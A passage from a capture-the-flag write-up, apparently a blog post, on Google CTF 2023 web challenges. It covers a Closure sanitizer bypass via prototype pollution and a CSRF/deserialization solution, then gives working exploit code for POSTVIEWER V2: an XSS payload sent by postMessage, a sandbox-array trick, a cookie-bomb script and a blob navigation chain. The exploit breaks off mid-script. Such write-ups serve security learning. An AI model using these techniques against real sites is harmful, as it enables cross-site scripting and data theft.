string">'goog.html.sanitizer.unsafe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.html.sanitizer.HtmlSanitizer.Builder'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.string.Const'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> Const <span class="token operator">=</span> goog<span class="token punctuation">.</span>string<span class="token punctuation">.</span>Const<span class="token punctuation">;</span>  <span class="token keyword">var</span> unsafe <span class="token operator">=</span> goog<span class="token punctuation">.</span>html<span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span>unsafe<span class="token punctuation">;</span>  <span class="token keyword">var</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">goog<span class="token punctuation">.</span>html<span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span>HtmlSanitizer<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  builder <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">alsoAllowTags</span><span class="token punctuation">(</span>      Const<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'IFRAME is required for Youtube embed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> builder<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'IFRAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  sanitizer <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">alsoAllowAttributes</span><span class="token punctuation">(</span>      Const<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'iframe#src is required for Youtube embed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> builder<span class="token punctuation">,</span>      <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>        <span class="token literal-property property">tagName</span><span class="token operator">:</span> <span class="token string">'iframe'</span><span class="token punctuation">,</span>        <span class="token literal-property property">attributeName</span><span class="token operator">:</span> <span class="token string">'src'</span><span class="token punctuation">,</span>        <span class="token function-variable function">policy</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span> <span class="token operator">?</span> s <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function-variable function">setInnerHTML</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">elem<span class="token punctuation">,</span> html</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  goog<span class="token punctuation">.</span>dom<span class="token punctuation">.</span>safe<span class="token punctuation">.</span><span class="token function">setInnerHtml</span><span class="token punctuation">(</span>elem<span class="token punctuation">,</span> html<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This sanitizer can be bypassed partially through prototype pollution. You cannot use new tags, but you can bypass attribute restrictions. For example, iframes are allowed, so you can use iframe srcdoc.</p><p>There is a complication with the CSP: <code>base-uri &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39; &#39;unsafe-eval&#39;; require-trusted-types-for &#39;script&#39;;</code>. It includes trusted types, so even though you can inject <code>&lt;img src=x onerror=alert(1)&gt;</code>, the underlying sanitizer triggers a trusted types error when executing <code>img.setAttribute(&#39;onerror&#39;,&#39;alert(1)&#39;)</code>, causing the attack to fail.</p><p>I struggled for a while to bypass this restriction. Eventually, I had the idea that there are test HTML files under the static folder. If any of those files have an XSS vulnerability, we can simply use an iframe src to obtain the flag. I did some searching at the time but couldn’t find any suitable file. However, after the competition, I saw that someone did manage to solve it using this file: <a href="https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html">https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html</a></p><p>Later, I realized that the way it loads JavaScript is like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/closure-library/closure/goog/base.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/bootstrap.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/sanitizer.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/main.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>There is a variable called <code>editor</code> defined in <code>bootstrap.js</code>, which is then loaded as a script src in <code>main.js</code>. If we block the loading of <code>bootstrap.js</code> using iframe csp and then combine it with polluting <code>Object.prototype.editor</code>, we can load any JS.</p><p>And this is indeed the intended solution.</p><p>I learned this trick in the <a href="https://github.com/aszx87410/ctf-writeups/issues/48">Intigriti’s November XSS challenge</a>, where CSP was tightened to prevent the loading of certain scripts.</p><h3><span id="veggie-soda-13-solves">VEGGIE SODA (13 solves)</span></h3><p>During the competition, one of my teammates solved this completely without my help.</p><p>After the competition, I looked at the official solution. The first level bypasses CSRF protection using HEAD, which seems to be a commonly used technique. The second level looks similar to last year’s <a href="https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves">HORKOS</a>, involving JS deserialization vulnerability. Once a gadget chain is found, XSS can be achieved.</p><p>Here is the link to the official solution: <a href="https://github.com/google/google-ctf/tree/master/2023/web-vegsoda">https://github.com/google/google-ctf/tree/master/2023/web-vegsoda</a></p><h3><span id="postviewer-v2-7-solves">POSTVIEWER V2 (7 solves)</span></h3><p>This challenge is the reason why I kept avoiding writing a writeup. It’s like the movie Inception, with layer upon layer, so complex that I didn’t even know what I was doing towards the end.</p><p>Although it’s called V2, it’s quite different from last year’s challenge.</p><p>Let’s focus on this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">previewIframe</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> shimUrl<span class="token punctuation">,</span> container<span class="token punctuation">,</span> sandbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'allow-scripts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>shimUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>host <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">sbx-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">generateRandomPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>    container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        iframe<span class="token punctuation">.</span>contentWindow<span class="token operator">?.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> sandbox<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Here, a random sbx domain iframe is added, and the flag is passed through postMessage. The content of this sbx domain is also simple:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">TRUSTED_ORIGIN</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Untrusted Origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">DEFAULT_STYLE</span> <span class="token operator">=</span> <span class="token string">'position:absolute; top:0; left:0; bottom:0; right:0; width:100vw; height:100vh; border:none; margin:0; padding:0; z-index:999999;'</span>    window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> forbidden_sbx <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">allow-same-origin</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Wrong origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> <span class="token operator">!</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>mimeType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"No content to render"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">type</span><span class="token operator">:</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>mimeType        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>cssText <span class="token operator">=</span> <span class="token constant">DEFAULT_STYLE</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>        iframe<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> value <span class="token keyword">of</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>forbidden_sbx<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>iframe<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span><span class="token function">supports</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Unsupported value: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                iframe<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>                iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>        window<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        e<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'blob loaded'</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The received content is turned into a blob and then placed in a sandbox iframe. Our goal is to steal the content inside this iframe.</p><p>There are a few troublesome points:</p><ol><li>The admin bot has restrictions. We cannot open new windows, and any functionality similar to <code>window.open</code> is not allowed.</li><li>The CSP of the main domain is: <code>frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; frame-src *.postviewer2-web.2023.ctfcompetition.com</code></li><li>The CSP of the sbx domain is: <code>frame-src blob:</code></li></ol><p>Firstly, we can easily obtain XSS on any sbx domain, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> urliframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">body</span><span class="token operator">:</span><span class="token string">"&lt;script>alert(document.domain)&lt;/script>"</span><span class="token punctuation">,</span> <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span><span class="token string">"allow-scripts"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Now, the question is, what can we do next?</p><p>Our first step should be finding a way to bring the main domain into an iframe to perform further operations. However, the sbx domain only allows embedding pages starting with <code>blob:</code>, so how do we proceed?</p><p>At this point, we thought of using a cookie bomb to make the sbx domain return <code>HTTP/2 413 Request Entity Too Large</code>, which would remove the CSP error page.</p><p>The process is as follows:</p><ol><li>Load our own webpage first.</li><li>Embed an sbx iframe to obtain XSS.</li><li>Write a cookie from the sbx iframe to prevent loading of the &#x2F;bomb path.</li><li>Add another iframe with &#x2F;bomb, which has no CSP.</li><li>From the iframe in step 2, directly modify the content of the iframe in step 4 to obtain an XSS without CSP.</li><li>Now we can embed the main domain inside the iframe.</li></ol><p>Steps 1 to 5 are correct, but step 6 is incorrect. Although there is no longer the restriction of <code>frame-src blob:</code>, the <code>frame-ancestors *.postviewer2-web.2023.ctfcompetition.com;</code> of the main domain refers to all parent pages. So, as long as our top-level page is our own, we cannot bypass the CSP.</p><p>Then I suddenly thought of using a blob, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;h1>hello&lt;/h1>&lt;iframe src="http://127.0.0.1:5000/test">&lt;/iframe>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>url <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>location <span class="token operator">=</span> url<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This way, the top-level domain becomes <code>sbx-xxx.postviewer2-web.2023.ctfcompetition.com</code>, which satisfies the CSP.</p><p>However, an error occurred during the attempt:</p><blockquote><p>Unsafe attempt to initiate navigation for frame with origin ‘<a href="http://localhost:3000/">http://localhost:3000/</a>‘ from frame with URL ‘blob:<a href="https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818">https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818</a>‘. The frame attempting to navigate the top-level window is cross-origin and either it or one of its ancestors is not allowed to navigate the top frame.</p></blockquote><p>Later, my teammate found that adding the sandbox attribute to the iframe resolved the issue: <code>frame.sandbox = &#39;allow-modals allow-scripts allow-top-navigation allow-same-origin&#39;</code>. This behavior is worth recording because I thought that not having the sandbox attribute would provide more permissions, but it turns out that adding the sandbox attribute is necessary.</p><p>So the updated process is as follows:</p><ol><li>Load our own webpage first.</li><li>Embed an sbx iframe (f1) to obtain XSS.</li><li>Write a cookie from frame1 to prevent loading the &#x2F;bomb path.</li><li>Add another iframe for &#x2F;bomb (f2) without CSP.</li><li>Add another iframe (f3) for executing operations.</li><li>Modify the HTML of f2 from f3, where the script written will add a blob HTML and then change the top.location.</li><li>Successfully load the blob without any CSP.</li><li>Load the main domain iframe on the blob page.</li></ol><p>At this point, the exploit has already reached 100 lines and is extremely complex:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">createBombFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> bombFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    bombFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url    bombFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'bombFrame created'</span><span class="token punctuation">)</span>      bombFrame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">          &lt;script>            const domain = document.domain            const cookieCount = 10            const cookieLength = 3000            const expireAfterMinute = 5            setCookieBomb()            function setCookie(key, value) &#123;              const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000);              const v = key + '=' + value + '; path=/bomb; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString()              parent.document.cookie = v            &#125;            function setCookieBomb() &#123;              const value = 'Boring' + '_'.repeat(cookieLength)              for (let i=0; i&lt;cookieCount; i++) &#123;                setCookie('key' + i, value);              &#125;            &#125;          &lt;\/script></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>        <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span> <span class="token string">"allow-scripts"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>bombFrame<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">createBrokenFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token 